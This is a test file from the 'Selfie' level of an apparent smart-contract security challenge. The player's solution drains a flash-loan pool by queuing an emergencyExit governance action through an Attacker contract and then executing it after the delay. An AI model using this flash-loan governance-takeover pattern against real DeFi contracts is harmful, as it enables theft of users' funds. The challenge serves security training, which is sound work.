const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require('@nomicfoundation/hardhat-network-helpers');

describe('[Challenge] Selfie', function () {
  let deployer, player;
  let token, governance, pool;

  const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
  const TOKENS_IN_POOL = 1500000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    // Deploy Damn Valuable Token Snapshot
    token = await (
      await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)
    ).deploy(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = await (
      await ethers.getContractFactory('SimpleGovernance', deployer)
    ).deploy(token.address);
    expect(await governance.getActionCounter()).to.eq(1);

    // Deploy the pool
    pool = await (
      await ethers.getContractFactory('SelfiePool', deployer)
    ).deploy(token.address, governance.address);
    expect(await pool.token()).to.eq(token.address);
    expect(await pool.governance()).to.eq(governance.address);

    // Fund the pool
    await token.transfer(pool.address, TOKENS_IN_POOL);
    await token.snapshot();
    expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
    expect(await pool.flashFee(token.address, 0)).to.eq(0);
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    // 1. deploy attacker contract
    const attacker = await (
      await ethers.getContractFactory(
        'contracts/selfie/Attacker.sol:Attacker',
        player
      )
    ).deploy(pool.address, governance.address, token.address);
    // 2. construct transfer Token data
    const data = pool.interface.encodeFunctionData('emergencyExit', [
      player.address
    ]);

    const tx = await attacker.connect(player).attack(data);
    const res = await tx.wait();
    // console.log(res);
    // const logs = res.logs.map((item) =>
    //   governance.interface.parseLog({
    //     topics: [...item.topics],
    //     data: item.data,
    //   })
    // );
    // console.log(logs);
    await ethers.provider.send('evm_increaseTime', [
     ( await governance.getActionDelay()).toNumber(),
    ]);
    // 3. execute governance action
    await governance
      .connect(player)
      .executeAction((await governance.getActionCounter()).sub(1));
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.be.equal(0);
  });
});
